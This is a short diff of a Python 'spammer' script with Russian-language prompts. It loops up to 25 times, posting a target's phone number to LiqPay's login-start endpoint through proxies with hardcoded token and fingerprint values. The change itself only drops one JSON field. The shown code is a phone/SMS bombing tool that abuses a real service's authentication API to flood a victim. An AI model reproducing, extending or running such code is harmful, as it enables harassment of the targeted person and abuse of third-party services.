@@ -51,7 +51,7 @@ else:
 run = int(console.input('[green]Введите количество повторов (1-25):\n[blue]spammer>> '))
 for _ in track(range(run)):
  try:
-         requests.post("https://www.liqpay.ua/apiweb/login/start", json={"token": "1643391525750342_1695506_OLxTT5R4T3W4l72cHAyB", "phone": number, "fingerprint": "aef9e6ae5471175b7c6e8411f9429a2b-f3fstmzql", "pagetoken": "1643391525750342_1695506_OLxTT5R4T3W4l72cHAyB"}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
+         requests.post("https://www.liqpay.ua/apiweb/login/start", json={"token": "1643391525750342_1695506_OLxTT5R4T3W4l72cHAyB", "phone": number, "fingerprint": "aef9e6ae5471175b7c6e8411f9429a2b-f3fstmzql"}, headers=headers, proxies=proxies)#https://www.liqpay.ua/ru/authorization
          print('104.ua')
  except:
          print('Не доставлено (104.ua)')
